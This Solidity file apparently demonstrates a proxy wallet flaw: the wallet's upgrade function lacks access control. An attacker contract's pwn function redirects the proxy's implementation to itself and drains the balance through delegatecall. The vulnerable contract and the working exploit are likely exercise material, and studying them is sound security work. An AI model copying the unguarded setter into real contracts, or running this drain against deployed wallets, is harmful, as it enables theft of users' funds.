// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract UpgradableWallet {
    address public implementation;
    address public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }
}

contract WalletImplementation {
    address public implementation;
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    receive() external payable {}

    function setImplementation(address _implementation) external {
        implementation = _implementation;
    }

    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
    }
}

contract UpgradableWalletExploit {
    address public target;

    constructor(address _target) {
        // target is address of UpgradableWallet
        target = _target;
    }

    receive() external payable {}

    function pwn() external {
        target.call(abi.encodeWithSignature("setImplementation(address)", address(this)));
        target.call(abi.encodeWithSignature("withdraw()"));
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);

    }
}
